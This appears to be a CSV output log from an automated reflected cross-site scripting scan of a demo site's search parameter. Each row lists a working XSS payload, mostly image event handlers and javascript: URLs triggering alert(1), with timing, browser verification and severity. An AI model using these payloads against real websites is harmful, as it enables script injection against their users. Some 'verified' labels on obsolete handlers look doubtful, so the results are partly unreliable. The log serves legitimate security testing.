Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:58:44.915,2026-01-10 16:58:45.035,0.120,https://demo-knsl.onrender.com/search,GET,q,<form><button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.948,2026-01-10 16:58:45.051,0.103,https://demo-knsl.onrender.com/search,GET,q,<meta http-equiv=refresh content=0;url=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.954,2026-01-10 16:58:45.054,0.099,https://demo-knsl.onrender.com/search,GET,q,"<meta http-equiv=refresh content=""0;javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.300,2026-01-10 16:58:45.090,0.790,https://demo-knsl.onrender.com/search,GET,q,<input onblur=alert(1) autofocus><input>,RAW_REFLECTION,No,,High
2026-01-10 16:58:45.019,2026-01-10 16:58:45.131,0.111,https://demo-knsl.onrender.com/search,GET,q,<style>*{background:url('javascript:alert(1)')}</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.026,2026-01-10 16:58:45.135,0.109,https://demo-knsl.onrender.com/search,GET,q,<style>@import'javascript:alert(1)';</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.035,2026-01-10 16:58:45.138,0.102,https://demo-knsl.onrender.com/search,GET,q,<math><mi xlink:href=javascript:alert(1)>X</mi></math>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.051,2026-01-10 16:58:45.162,0.111,https://demo-knsl.onrender.com/search,GET,q,<table background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.054,2026-01-10 16:58:45.165,0.111,https://demo-knsl.onrender.com/search,GET,q,<table><td background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.090,2026-01-10 16:58:45.204,0.114,https://demo-knsl.onrender.com/search,GET,q,<div onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.135,2026-01-10 16:58:45.238,0.103,https://demo-knsl.onrender.com/search,GET,q,<script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.131,2026-01-10 16:58:45.241,0.111,https://demo-knsl.onrender.com/search,GET,q,<div style=width:expression(alert(1))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.138,2026-01-10 16:58:45.244,0.106,https://demo-knsl.onrender.com/search,GET,q,<script>alert&#x28;1&#x29;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.029,2026-01-10 16:58:45.248,0.219,https://demo-knsl.onrender.com/search,GET,q,<style onload=alert(1)></style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.162,2026-01-10 16:58:45.261,0.099,https://demo-knsl.onrender.com/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.165,2026-01-10 16:58:45.262,0.097,https://demo-knsl.onrender.com/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.453,2026-01-10 16:58:45.324,0.871,https://demo-knsl.onrender.com/search,GET,q,"<iframe  rc=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,No,,High
2026-01-10 16:58:45.204,2026-01-10 16:58:45.331,0.127,https://demo-knsl.onrender.com/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.248,2026-01-10 16:58:45.345,0.098,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.241,2026-01-10 16:58:45.357,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x onafterprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.261,2026-01-10 16:58:45.373,0.112,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforecopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.262,2026-01-10 16:58:45.375,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforecut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.331,2026-01-10 16:58:45.460,0.129,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeeditfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.324,2026-01-10 16:58:45.464,0.140,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforedeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.345,2026-01-10 16:58:45.469,0.123,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforepaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.357,2026-01-10 16:58:45.472,0.115,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.375,2026-01-10 16:58:45.489,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.373,2026-01-10 16:58:45.491,0.118,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.799,2026-01-10 16:58:45.543,0.744,https://demo-knsl.onrender.com/search,GET,q,<marquee loop=1 onfinish=alert(1)>x</marquee>,RAW_REFLECTION,No,,High
2026-01-10 16:58:45.464,2026-01-10 16:58:45.574,0.110,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbounce=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.460,2026-01-10 16:58:45.578,0.118,https://demo-knsl.onrender.com/search,GET,q,<img src=x onblur=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.469,2026-01-10 16:58:45.590,0.121,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncellchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.489,2026-01-10 16:58:45.594,0.105,https://demo-knsl.onrender.com/search,GET,q,<img src=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.491,2026-01-10 16:58:45.603,0.112,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncontextmenu=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.882,2026-01-10 16:58:45.636,0.754,https://demo-knsl.onrender.com/search,GET,q,<a href=javascript:alert(1)>click</a>,RAW_REFLECTION,No,,High
2026-01-10 16:58:45.543,2026-01-10 16:58:45.652,0.109,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncontrolselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.578,2026-01-10 16:58:45.678,0.100,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.590,2026-01-10 16:58:45.706,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondataavailable=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.594,2026-01-10 16:58:45.710,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondatasetchanged=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.603,2026-01-10 16:58:45.735,0.131,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondatasetcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.652,2026-01-10 16:58:45.758,0.107,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.636,2026-01-10 16:58:45.761,0.125,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondblclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.678,2026-01-10 16:58:45.780,0.103,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.706,2026-01-10 16:58:45.819,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.735,2026-01-10 16:58:45.823,0.088,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.710,2026-01-10 16:58:45.836,0.127,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.758,2026-01-10 16:58:45.855,0.097,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.761,2026-01-10 16:58:45.857,0.096,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.780,2026-01-10 16:58:45.897,0.117,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.819,2026-01-10 16:58:45.920,0.100,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.823,2026-01-10 16:58:45.930,0.107,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerrorupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.836,2026-01-10 16:58:45.934,0.097,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfilterchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.857,2026-01-10 16:58:45.963,0.105,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.855,2026-01-10 16:58:45.968,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfinish=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.897,2026-01-10 16:58:46.012,0.115,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfocusin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.920,2026-01-10 16:58:46.017,0.097,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfocusout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.930,2026-01-10 16:58:46.029,0.099,https://demo-knsl.onrender.com/search,GET,q,<img src=x onhelp=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.934,2026-01-10 16:58:46.034,0.100,https://demo-knsl.onrender.com/search,GET,q,<img src=x oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.963,2026-01-10 16:58:46.062,0.099,https://demo-knsl.onrender.com/search,GET,q,<img src=x onkeydown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.968,2026-01-10 16:58:46.072,0.105,https://demo-knsl.onrender.com/search,GET,q,<img src=x onkeypress=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.238,2026-01-10 16:58:46.084,0.846,https://demo-knsl.onrender.com/search,GET,q,<img src=x onactivate=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:58:45.244,2026-01-10 16:58:46.084,0.840,https://demo-knsl.onrender.com/search,GET,q,<img src=x onafterupdate=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:58:46.012,2026-01-10 16:58:46.119,0.106,https://demo-knsl.onrender.com/search,GET,q,<img src=x onkeyup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.029,2026-01-10 16:58:46.143,0.114,https://demo-knsl.onrender.com/search,GET,q,<img src=x onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.072,2026-01-10 16:58:46.175,0.102,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.062,2026-01-10 16:58:46.178,0.115,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmousedown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.084,2026-01-10 16:58:46.186,0.102,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.084,2026-01-10 16:58:46.189,0.105,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmousemove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.119,2026-01-10 16:58:46.223,0.105,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.143,2026-01-10 16:58:46.254,0.110,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.472,2026-01-10 16:58:46.282,0.809,https://demo-knsl.onrender.com/search,GET,q,<img src=x onchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:58:46.175,2026-01-10 16:58:46.290,0.115,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.178,2026-01-10 16:58:46.294,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmousewheel=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.189,2026-01-10 16:58:46.307,0.117,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmoveend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.223,2026-01-10 16:58:46.327,0.104,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmovestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.254,2026-01-10 16:58:46.354,0.101,https://demo-knsl.onrender.com/search,GET,q,<img src=x onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.282,2026-01-10 16:58:46.386,0.105,https://demo-knsl.onrender.com/search,GET,q,<img src=x onpropertychange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:45.574,2026-01-10 16:58:46.392,0.817,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncopy=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:58:46.290,2026-01-10 16:58:46.393,0.103,https://demo-knsl.onrender.com/search,GET,q,<img src=x onreadystatechange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.294,2026-01-10 16:58:46.414,0.120,https://demo-knsl.onrender.com/search,GET,q,<img src=x onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.327,2026-01-10 16:58:46.426,0.098,https://demo-knsl.onrender.com/search,GET,q,<img src=x onresizeend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.354,2026-01-10 16:58:46.469,0.114,https://demo-knsl.onrender.com/search,GET,q,<img src=x onresizestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
